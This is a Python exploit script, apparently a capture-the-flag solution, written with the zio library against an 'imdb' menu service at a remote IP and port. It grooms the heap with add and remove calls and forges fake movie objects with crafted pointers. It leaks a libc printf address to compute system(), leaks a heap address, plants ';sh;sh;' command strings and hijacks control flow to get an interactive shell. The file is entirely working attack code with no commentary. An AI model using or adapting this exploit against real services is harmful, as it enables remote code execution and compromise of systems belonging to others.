from zio import *

#io=zio('./imdb',timeout=9999)
io=zio(('119.254.101.197',10003),timeout=9999)
#io.gdb_auto([0x4011b4])
raw_input()
def addTV(l):
    io.rwl('?','1')
    for n in l:
        io.rwl('?',n)
def addmovie(l):
    io.rwl('?','2')
    for n in l:
        io.rwl('?',n)
def remove(name):
    io.rwl('?','3')
    io.rwl('?',name)
def leak(s):
    io.rwl('?','4')
    io.read_until(s)
    io.read_until('actors: ')
    return io.read_until('\x0a')[:-1]
addTV(['n'*63,'s'*15,'s'*15,'s'*127])
addTV(['n'*63,'s'*15,'s'*15,'s'*127])
addTV(['n'*63,'s'*15,'s'*15,'s'*127])
addTV(['n'*63,'s'*15,'s'*15,'s'*127])

remove('n'*63)
fakemovie=''
fakemovie+=l64(0x4015B0)
fakemovie+='x'*(0xd0-len(fakemovie))
fakemovie+=l64(0x601c28+1)
addmovie(['n',fakemovie,'c'*15,'d'*127])

#fakemovie=''
#fakemovie+=l64(0x4015B0)
#fakemovie+='y'*(0xd0-len(fakemovie))
#fakemovie+=l64(0x601c30)
#addmovie(['n',fakemovie,'c'*15,'d'*127])

printfaddr=l64('\x00'+leak('xxxxxxxx')+'\x00\x00')
print hex(printfaddr)
systemaddr=printfaddr-0x54400+0x46640

print hex(systemaddr)


addTV(['p'*63,'s'*15,'s'*15,'s'*127])
addTV(['p'*63,'s'*15,'s'*15,'s'*127])
addTV(['p'*63,'s'*15,'s'*15,'s'*127])
addTV(['p'*63,'s'*15,'s'*15,'s'*127])

remove('p'*63)
fakemovie=''
fakemovie+=l64(0x4015B0)
fakemovie+=';sh;sh;'
fakemovie+='q'*(0xd0-len(fakemovie))
fakemovie+=l64(0x601DC0)
addmovie(['X',fakemovie,'c'*15,'d'*127])
r=leak('qqqqqq')
heapaddr=l64(r+'\x00'*(8-len(r)))
print 'heapaddr',hex(heapaddr)


addTV(['r'*63,'s'*15,'s'*15,'s'*127])
addTV(['r'*63,'s'*15,'s'*15,'s'*127])
addTV(['r'*63,'s'*15,'s'*15,'s'*127])
addTV(['r'*63,'s'*15,'s'*15,'s'*127])

remove('r'*63)
fakemovie=''
fakemovie+=l64(heapaddr+0x4a0)
fakemovie+=';sh;sh;rOOOOOOOOPPPPPPPP'+l64(printfaddr-0x54400+0x4652c)
fakemovie+='r'*(0xd0-len(fakemovie))
fakemovie+=l64(0x601DC0)
addmovie(['X',fakemovie,'c'*15,'d'*127])


#print hex(leak('yyyyyyy'))
io.interact()
